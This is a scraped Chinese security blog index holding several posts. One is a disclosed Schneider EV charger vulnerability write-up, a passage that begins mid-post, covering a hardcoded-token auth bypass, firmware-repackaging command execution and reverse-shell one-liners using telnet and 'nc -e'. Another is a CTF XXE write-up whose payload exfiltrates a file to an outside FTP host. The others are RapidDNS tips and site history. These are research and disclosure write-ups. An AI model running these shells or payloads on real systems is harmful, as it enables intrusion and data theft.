&lt;p&gt;这个时候G键跳到出错的&lt;code&gt;1ADC&lt;/code&gt;的地方，可以看到是个负值，指向它的上一行&lt;code&gt;alt+k&lt;/code&gt;,改为大于负值，在按F5快捷键即可。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;接下来就可以进行愉快的分析了。另外，后续使用IDA7.5分析不存在上述问题。&lt;/p&gt;
&lt;h3 id=&#34;硬编码的token&#34;&gt;硬编码的token&lt;/h3&gt;
&lt;p&gt;打开菜单view-----&amp;gt;Open subviews-----&amp;gt;strings。先大概看一下是否有一些关键的字符串。当然也可以使用strings命令来获取。&lt;/p&gt;
&lt;p&gt;在字符串窗口中，使用搜索功能尝试搜索password，token，username等关键词。逐个查看来快速定位关键位置。&lt;/p&gt;
&lt;p&gt;在搜索的时候，可以看到不少&lt;code&gt;snprintf(&amp;amp;s, 0x32u, &amp;quot;%s called (&amp;quot;, &amp;quot;instance&amp;quot;);&lt;/code&gt; 形如这样的语法，可以猜测该功能是调试用的。很明显这里是显示调用函数的字符串。那么%s就是该函数的名字。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086147325.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x04 calls_example.png)&lt;/p&gt;
&lt;p&gt;可批量搜索&lt;code&gt;%s called (&lt;/code&gt; ，然后修改该函数的函数名。根据索索到的结果，可以逐个修改当前代码所在的函数名字。只需要在函数名字上按n即可进行修改。修改函数之后，将对后面的分析带来便利。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086151881.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x05 calls_example2.png)&lt;/p&gt;
&lt;p&gt;通过通读代码，了解程序的执行逻辑。然后对其单点进行分析，首先将注意力放在了处理session验证的代码块。其代码在&lt;code&gt;treatRequestInternal&lt;/code&gt;函数内，从名字可以看出是处理内部请求的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086156708.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x06 get_cookies.png)&lt;/p&gt;
&lt;p&gt;可以看到该函数首先获取了用户请求中的cookie值，包括SESSIONID、SESSIONTOKEN、CURLTOKEN。在接着往下走，会发现一个判断分支，其中一个分支会判断cookie中的CURLTOKEN是否等于一个固定的字符串，成功会设置v153变量为1。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086162076.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](images/0x07 compare_curltoken.png)&lt;/p&gt;
&lt;p&gt;在继续向下读代码，另外一个分支则是从表单中获取login和password参数，然后使用TestPassword判断用户名和密码，成功后设置v153变量为1。而调试的信息也显示Loginok，即登录成功字样。说明这里判断登录与上述判断具有同样的效果。通过下文可知v153变量值为1是通过验证的标志。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086166504.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](images/0x08 loginok.png)&lt;/p&gt;
&lt;p&gt;由以上的分析，可以确定存在硬编码的token，我们在请求带上CURLTOKEN即可绕过验证。接下来到实际的web系统中测试，在cookie中带上&lt;code&gt;CURLTOKN=b35fcdc1ea1***a0131c5a&lt;/code&gt;，在未登录情况下尝试访问一些页面，发现会提示&lt;code&gt;You are not connected with sufficient privilege worker :SelectTabsModel user :evse&lt;/code&gt;的错误，那么这里就是判断了权限，也可以在上面代码可以看到跟evse相关的地方。上面可以看到v55变量，是获取cookie中的SESSIONID,这个也是我们可以构造的，构造SESSIONID=admin，即可绕过权限认证。实现无需密码进行web系统的管理。事情变得有趣了，这像是一个后门？在分析显示日志功能时，我明白了其原因。在打开report时，并不是由前端调用显示日志的页面，而是后端利用curl来获取的，所以叫CURLTOKEN。这就导致了这个漏洞的产生。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086173409.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x09 auth_bypass.png)&lt;/p&gt;
&lt;h3 id=&#34;升级文件重打包导致的远程命令执行&#34;&gt;升级文件重打包导致的远程命令执行&lt;/h3&gt;
&lt;p&gt;有了上面的漏洞就可以进行许多管理员操作。这里可以优先寻找存在执行命令的位置，通过快捷键x来寻找调用execv，只有4处调用，3处主要都集中在Install的函数中。查看后发现，程序路径都是写死的，命令执行的路断了。但是在查看其上下文时，发现在执行命令前使用&lt;code&gt;setenv&lt;/code&gt;设置了环境变量。变量的名字时EPK_KEY。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086177716.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x10 execv_epk.png)&lt;/p&gt;
&lt;p&gt;下面执行&lt;code&gt;/mnt/datas/opt/evse/epk-install.sh&lt;/code&gt;文件。升级包的后缀是epk，函数名是Install。很明显升级固件就是这个地方了。如果我们可以构造自己的固件内容，上传恶意文件上去，那么就可以实现系统的控制了。&lt;/p&gt;
&lt;p&gt;这里去读&lt;code&gt;epk-install.sh&lt;/code&gt;文件，来了解epk的处理方式，在&lt;code&gt;evse_jffs2_base.img&lt;/code&gt;的镜像中找到了这个文件。&lt;/p&gt;
&lt;p&gt;通过阅读代码可以了解到其流程，获取传入的文件名，将环境变量中的&lt;code&gt;EPK_KEY&lt;/code&gt;赋值给&lt;code&gt;private_key&lt;/code&gt;，然后判断安装的文件是否存在，存在就解压缩文件到一个临时文件夹中，接下来将&lt;code&gt;private_key&lt;/code&gt;写入到这个临时文件夹中，文件名为&lt;code&gt;private&lt;/code&gt;。根据这个来计算出一个sha256sum的值写入到&lt;code&gt;CONTROL2&lt;/code&gt;文件中，比较CONTROL和CONTROL2的内容，，如果一致，执行&lt;code&gt;run.sh&lt;/code&gt;文件。在之前前会删除掉&lt;code&gt;private&lt;/code&gt;文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086183561.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x11 get_epk_key.png)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086187334.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![0x12 sha256sum](./images/0x12 sha256sum.png)&lt;/p&gt;
&lt;p&gt;由于CONTROL文件在压缩包中，这个值可控并且计算方式也很简单，这里直接调用命令即可生成。调用的&lt;code&gt;run.sh&lt;/code&gt;文件也是在升级包中的，这里直接替换&lt;code&gt;run.sh&lt;/code&gt;文件的内容为我们自己的命令，这样就可以实现任意命令执行了。最后使用tar cf命令打包即可，更新固件即可触发。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086191425.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![build_tar](images/0x13 build_tar.png)&lt;/p&gt;
&lt;p&gt;按照分析的结果，写入反弹shell的命令到&lt;code&gt;run.sh&lt;/code&gt;文件中。打包上传更新固件。等待shell出现，但是很遗憾，失败了。这里可能存在几种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;升级过程中，设备没有网络;&lt;/li&gt;
&lt;li&gt;反弹shell的命令失败。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对于第一种，先修改为curl的请求试试。结果成功执行。说明网络是通的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086195602.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![0x09_curl](./images/0x14 ping_test.png)&lt;/p&gt;
&lt;p&gt;网络没问题，问题就简单了。更换不同的反弹shell命令试试。换了几种方式失败后，最终通过&lt;code&gt;telnet ip port1 | /bin/bash | telnet ip port2&lt;/code&gt;成功反弹。真是激动人心的时刻。&lt;/p&gt;
&lt;p&gt;这个反弹的原理就是监听两个端口，端口1的连接负责输入命令，端口2的连接接收输出。当然在后续的测试中，这个尽管可以成功，但是还有网络因素导致输出的端口连接失败的情况。但是这里影响不大，可以输入&lt;code&gt;nc ip port3 -e /bin/bash&lt;/code&gt; 反弹回显端口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086201113.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![0x10_reverse_shell](./images/0x15 got reverse shell.png)&lt;/p&gt;
&lt;h3 id=&#34;一键root之漏洞脚本开发&#34;&gt;一键root之漏洞脚本开发&lt;/h3&gt;
&lt;p&gt;通过以上两个漏洞，可以实现无需登录的远程命令执行。但是每次输入命令，都比较麻烦。还是写一个脚本来自动化利用。&lt;/p&gt;
&lt;p&gt;脚本相对简单，linux系统，使用python的requests库可轻松实现。思路为，抓取固件更新的请求包，生成命令执行的epk文件，利用requests的post方法发送构造的请求。&lt;/p&gt;
&lt;p&gt;流程如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086206449.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![0x16 exploit-process](./images/0x16 exploit-process.png)&lt;/p&gt;
&lt;p&gt;通过抓包确定，发送的url路径为&lt;code&gt;/cgi-bin/cgiServer?worker=FileDispatcher&amp;amp;nextWorker=FirmwareUpgrade&amp;amp;finalWorker=FirmwareUpgrade&amp;amp;finalIp=内网ip地址&amp;amp;treatOnlyThisStation=yes&amp;amp;uploading=true&amp;amp;longProcessing=true&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里的内网ip地址，我首先使用127.0.0.1替换，但是，发现这样不行。再次抓包分析，这个ip地址可以通过访问&lt;code&gt;/cgi-bin/cgiServer?worker=FirmwareUpgradeForm&lt;/code&gt;来获得。使用正则表达式提取即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086210830.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![0x17 evse_pacp](./images/0x17 evse_pacp.png)&lt;/p&gt;
&lt;p&gt;这个问题解决后，又出现了第二个问题，就是上传失败。没执行。继续抓包分析，通过对比burp抓的包和reqeusts发送的包进行对比，发现少了content-typ:application/octet-stream。通过设置请求头是无效的。这里要通过&lt;code&gt;files = {&#39;fichier&#39;: (&#39;r7_update_3.3.0.12_d4.epk&#39;,open(&#39;r7_update_3.3.0.12_d4.epk&#39;, &#39;rb&#39;),&amp;quot;application/octet-stream&amp;quot;)}&lt;/code&gt;来设置就可以了。&lt;/p&gt;
&lt;h2 id=&#34;0x05-漏洞影响&#34;&gt;0x05 漏洞影响&lt;/h2&gt;
&lt;h3 id=&#34;漏洞影响&#34;&gt;漏洞影响&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;用于僵尸网络。&lt;/li&gt;
&lt;li&gt;横向渗透企业内部网络、家庭网络。为了确认真实性，通过对其IP地址进行分析，可以发现一些确实有企业在使用该充电桩。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;可能的利用方式&#34;&gt;可能的利用方式&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;与汽车进行数据交互，尝试fuzzing可能对汽车造成影响？&lt;/li&gt;
&lt;li&gt;控制电压，造成设备故障&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0x06-漏洞处理&#34;&gt;0x06 漏洞处理&lt;/h2&gt;
&lt;p&gt;漏洞发现后，以第一时间通报给施耐德官方厂商。并得到其厂商回复与致谢。公告地址：https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2021-194-06。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1628086216843.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;![](./images/0x18 ad_notice.png)&lt;/p&gt;
&lt;h2 id=&#34;0x07-总结&#34;&gt;0x07 总结&lt;/h2&gt;
&lt;p&gt;在前期对其不了解以及缺乏相关知识的情况下，通过边研究边学习来挖掘漏洞。其中耗费了许多精力，也遇到了许多大大小小的问题，过程中有收获。对于充电桩还有很多可以去探索的，大家感兴趣的也都可以在合法情况下进行研究。&lt;/p&gt;
">施耐德充电桩漏洞挖掘之旅</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/RapidDNS-tips-1/"" data-c="
          &lt;p&gt;大家好，我是BaCde。沉默了了有一段时间，最近一直在边开发边思考网站的发展。思考了很多，所以网站和公众号的更新就慢下来了。后续会多发一些跟网络安全相关的一些内容。&lt;/p&gt;
&lt;p&gt;今天来分享点关于RapidDNS使用的小技巧。&lt;/p&gt;
&lt;h2 id=&#34;linux-命令快速查询&#34;&gt;Linux 命令快速查询&lt;/h2&gt;
&lt;p&gt;将以下命令加入到 &lt;code&gt;bash_profile&lt;/code&gt;文件中。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rapiddns(){
	curl -s &amp;quot;https://rapiddns.io/subdomain/$1?full=1&amp;quot; \
	| grep -oP &#39;_blank&amp;quot;&amp;gt;\K[^&amp;lt;]*&#39; \
	| grep -v http \
	| sort -u 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后后面就可以使用rapiddns命令直接查询结果。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rapiddns tesla.com&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1624078793937.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;浏览器搜索引擎快速查询&#34;&gt;浏览器搜索引擎快速查询&lt;/h2&gt;
&lt;!-- more --&gt;
&lt;p&gt;linux下的命令行非常强大，那么windows下呢？我们可是利用Chrome浏览器的搜索引擎功能来简化查询。&lt;/p&gt;
&lt;p&gt;我们打开Chrome浏览器的设置，然后找到&lt;code&gt;管理搜索引擎&lt;/code&gt;，在点击&lt;code&gt;添加&lt;/code&gt;按钮，弹出如下窗口并图中配置设置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1624078798746.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;RadpidDNS_search_01.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置完成后，以后打开浏览器，直接输入rds{TAB}键，然后输入要搜索的域名按回车即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1624078802496.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;RadpidDNS_search_02.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果想查看所有，在上图的网址设置中加入加入&lt;code&gt;?full=1&lt;/code&gt; 参数即可，如果要直接弹出下载窗口，在继续加入&lt;code&gt;down=1&lt;/code&gt;即可。这样输入后会自动弹出下载csv的窗口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1624078806226.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;RadpidDNS_search_03.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过同样的方式也可以设置反查IP搜索，设置一个不同的关键字就可以了。&lt;/p&gt;
&lt;h2 id=&#34;goby查询&#34;&gt;Goby查询&lt;/h2&gt;
&lt;p&gt;Goby中有RapidDNS的插件，可以下载并安装。安装完成后在添加目标时点击RapidDNS按钮，输入要查询的域名，最后导入目标即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1624078810378.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;RadpidDNS_search_04.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询结果页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1624078814331.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;RadpidDNS_search_05.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;好了，今天的内容就到这里。&lt;/p&gt;
&lt;p&gt;关注本公众账号，获取最新的网站功能、使用技巧等内容。&lt;/p&gt;
&lt;center&gt;
本文为原创内容，转载请标明出处。
&lt;p&gt;长按识别二维码，关注我&lt;/p&gt;
&lt;/center&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615992545149.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">如何高效使用RapidDNS</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Cyber-Apocalypse-2021-Web-Artillery-WriteUP/"" data-c="
          &lt;p&gt;大家好，我是BaCde，上周临时组队参与了HackTheBox组织的Cyber Apocalyps 2021的CTF比赛。今天主要写一下Web的Artillery，这是一道3星题（最难为4星），这是一道关于XXE利用的题，做出来的人相对很少，也花了不少时间，有些收获，这里写出来与大家分享。本文不介绍基础知识，如果要学习基础可以查看后面的推荐文章。&lt;/p&gt;
&lt;h2 id=&#34;收集信息&#34;&gt;收集信息&lt;/h2&gt;
&lt;p&gt;此次的CTF题大部分都提供源代码，并提供有Dockerfile文件，可通过docker build构建并运行。通过源码可知源代码为Java语言。openjdk 1.8.181版本，Web Server为Tomcat10。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594216716.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe6.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过Web.xml可知访问路径。访问页面只有一个搜索功能，你访问页面并在搜索框随意输入内容，可看到具体发送的请求。使用Brup记录并转发到Repeater，后面测试用。这里是自己搭建的Docker环境，访问地址http://42.192.74.184:18888。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594224803.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe2.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来查看源代码，具体业务实现的代码在Results.java中。功能就是接收POST提交的数据，先验证XML格式，然后在处理XML，最后解析的内容进入到数据库查询，返回结果。结合web.xml文件可知请求的路径就是上面的搜索功能了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594229408.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe3.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞探测&#34;&gt;漏洞探测&lt;/h2&gt;
&lt;p&gt;代码看上去基本都做了过滤处理，唯一一处就是第31行，允许file协议 。尝试读取一下/etc/passwd文件，发现报错，而且无法显示文件内容。尝试其他协议都会被拒绝。想来也不会这么简单。思路如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;尝试file://url/看是否可以外连。&lt;/li&gt;
&lt;li&gt;尝试jar:file://path!/xmlpath 这样的路径。&lt;/li&gt;
&lt;li&gt;利用系统自带的一些dtd。&lt;/li&gt;
&lt;li&gt;利用unix的socket文件。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过file://这样的方式可以发现发起了DNS请求，但是未收到HTTP的请求。这说明可以进行网络通信。而jar协议是支持的，找了几个路径，发现都利用失败了。而第三种，通过查看Dockerfile文件发现对系统自带的dtd文件都删掉了。第四种也没想到具体该如何利用。在测试过程中也可以注意到一个细节，就是在validate的那段代码，报错后是直接return的，如果validate通过，那么会进入下面的解析代码，导致无法利用。&lt;/p&gt;
&lt;p&gt;这里一度没有任何进展。重新梳理思路，回头继续看第一个，仔细查看了报错信息，有一个地方吸引了我,可以发现报错主要是FTP连接错误，这就解释为什么没有http请求了，因为是FTP协议。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594241282.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;获取flag&#34;&gt;获取Flag&lt;/h2&gt;
&lt;p&gt;使用vsftpd搭建FTP服务，启用匿名访问，防火墙端口全放开。最开始就是因为防火墙没开放（pasv模式的关系），导致传输文件失败，耗了不少时间。通过FTP的方式，发现确实可以将文件内容带出来，但是/etc/passwd的文件内容只有一行。后来修改了一下payload，直接将Flag.java文件通过报错的方式显示出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594247559.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe4.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;payload如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-raw&#34;&gt;POST /search HTTP/1.1
Host: 42.192.74.184:18888
Content-Length: 131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://42.192.74.184:18888
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE cdl [&amp;lt;!ENTITY % asd SYSTEM &amp;quot;file://42.192.74.184/evil_ftp_file.dtd&amp;quot;&amp;gt;%asd;%c;]&amp;gt;
&amp;lt;cdl&amp;gt;&amp;amp;rrr;&amp;lt;/cdl&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594254352.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe5.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;evil_ftp_file.dtd内容：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!ENTITY % d SYSTEM &amp;quot;file:///tomcat/webapps/ROOT/WEB-INF/classes/Flag.java&amp;quot;&amp;gt;
&amp;lt;!ENTITY % c &amp;quot;&amp;lt;!ENTITY rrr SYSTEM &#39;file://%d;另外一个ftp服务地址/%d;&#39;&amp;gt;&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;从此次解题可确定在openjdk 1.8.181环境下，使用&lt;code&gt;Validator&lt;/code&gt;并允许file协议时对xml进行validate时可以发起ftp请求，同时也支持jar协议。其他环境大家可自行测试。&lt;/p&gt;
&lt;p&gt;其利用方式有如下几种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在这样的情况下可利用ftp外带dtd读取任意文件。&lt;/li&gt;
&lt;li&gt;在没有删除本地dtd或xml文件情况下，可利用本地的dtd、xml文件进行利用。&lt;/li&gt;
&lt;li&gt;利用jar协议，通过加载jar中的xml或dtd文件进行利用。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;一些资料推荐&#34;&gt;一些资料推荐&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/&#34;&gt;Blind XXE attacks – Out of band interaction Techniques (OAST) to exfilterate data&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/xlocux/XXE-DTD-Finder&#34;&gt;XXE-DTD-Finder&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.noob.ninja/spilling-local-files-via-xxe-when/&#34;&gt;Spilling Local Files via XXE when HTTP OOB fails&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://newrouge.medium.com/xxe-from-zero-to-hero-b38118750556&#34;&gt;XXE : From Zero to Hero&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://gosecure.github.io/xxe-workshop/#1&#34;&gt;Advanced XXE Exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html&#34;&gt;Misconfigurations in Java XML Parsers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md&#34;&gt;XXE payloads for specific DTDs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/&#34;&gt;Exploiting XXE with local DTD files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html&#34;&gt;Automating local DTD discovery for XXE exploitation&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
">Cyber Apocalypse 2021 Web Artillery WriteUP</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/RapidDNS-03/"" data-c="
          &lt;p&gt;大家好！我是BaCde，2020年3月我着手开发RapidDNS这个网站，并于2020年4月1日正式上线。&lt;/p&gt;
&lt;p&gt;RapidDNS.io是一个在线域名查询和IP反向查询的网站。有超过25亿条记录，支持5种（A,AAAA,CNAME,MX,CERT）数据类型。到目前为止，网站全球Alexa排名15万左右并累计提供超过1亿次查询。现每月网站流量超过1TB。除此之外网站也被加入到Amass，OneForAll，theHarvester，Sudomy，subfinder，ksubdomain等众多知名开源项目中。&lt;/p&gt;
&lt;p&gt;接下来我就跟大家分享建设这个网站的过程。&lt;/p&gt;
&lt;h2 id=&#34;产生想法&#34;&gt;产生想法&lt;/h2&gt;
&lt;p&gt;2020年在做子域名收集的开发时，想起了Rapid7的DNS数据。经过对其进行分析后，确认是我需要的内容。于是便有了做一个在线的网站的想法，即方便自己同时又可以方便其他有需要的人。&lt;/p&gt;
&lt;p&gt;有了这个想法后就开始计划目标，确定只做子域名查询和IP地址反查。其实在开发时，想自己跑数据，但是资源有限。就决定先以Rapid7的DNS数据来尝试。后续也可根据具体情况在增加功能。&lt;/p&gt;
&lt;h2 id=&#34;面临的问题&#34;&gt;面临的问题&lt;/h2&gt;
&lt;p&gt;开始实现之前要考虑如何以最低的成本实现最好的效果。最好的效果即在多人同时访问时保证查询速度和系统稳定。因为这将直接决定采用什么样的架构来实现。&lt;/p&gt;
&lt;p&gt;先来分析下建设网站需要的东西。包括一个域名和至少一台服务器，用来存放web和数据。数据存储的空间至少要300gb，cpu至少双核，内存至少4g。这是没有增量和保存历史记录的情况。到各家云厂商,idc机房，根据这个配置对比了其价格，最低的服务器成本也要5000块一年（仅是数据存储）。&lt;/p&gt;
&lt;p&gt;因为打算做免费网站，这样的成本超出了我的预期，而且也可能性能不够。对于这个数据，国外已经有几篇数据运用的文章。其实现的思路有：1. 采用aws的Athena实现，2. 开源的DNSGrep，包括RapidDNS上线后采用mongodb实现的开源项目等。因为大多数围绕的是子域名查询，没有IP地址反查功能。而且Athena将随着用户数量增加，其费用也将非常恐怖，更适合自用。说了这么多，主要的问题说白了就是穷。&lt;/p&gt;
&lt;p&gt;另外一个省钱的思路就是从已有资源来想办法，这时想到了跟随我多年联想的笔记本电脑，它已经吃灰好久了，这是一个可利用的资源。这样只需要再买一个web服务器就可以了。根据之前调查的价格，这样的服务器一年大概需要不到2000块。&lt;/p&gt;
&lt;p&gt;但是这就产生了另外一个问题，家里的网络是光纤，没有固定ip地址，而且之前测试发现外网ip是无法直接访问的，映射端口是不行的。做端口转发？这个的性能没测试过，无法保证，也不打算采用。当然这里我想到了一个解决办法，在下面的内容中会讲到。&lt;/p&gt;
&lt;h2 id=&#34;解决方案&#34;&gt;解决方案&lt;/h2&gt;
&lt;p&gt;经过上面的考虑，最终我采用下面的结构。后来经过线上的运行情况，稳定性和查询速度还在接受的范围内。后续也可以增加worker和消息队列来支持其他方式的数据增加。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1616415608484.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;本地服务器就是我的一台笔记本电脑，其配置是3代i7，8G内存。1.2TB的固态硬盘(1TB+250TB两块组成)。数据存储与查询使用的是elasticsearch，前面加了一层nginx，并配置了认证。&lt;/p&gt;
&lt;p&gt;外部服务器是一台云主机，配置好为双核4G内存。包括nginx反向代理和Flask做的web查询界面。 外面又加了一层CDN。上面没有公网IP的问题，取了个巧，因为现在家里的网络都支持IPv6，所以外部服务器直接使用IPv6地址直连家里的笔记本电脑。&lt;/p&gt;
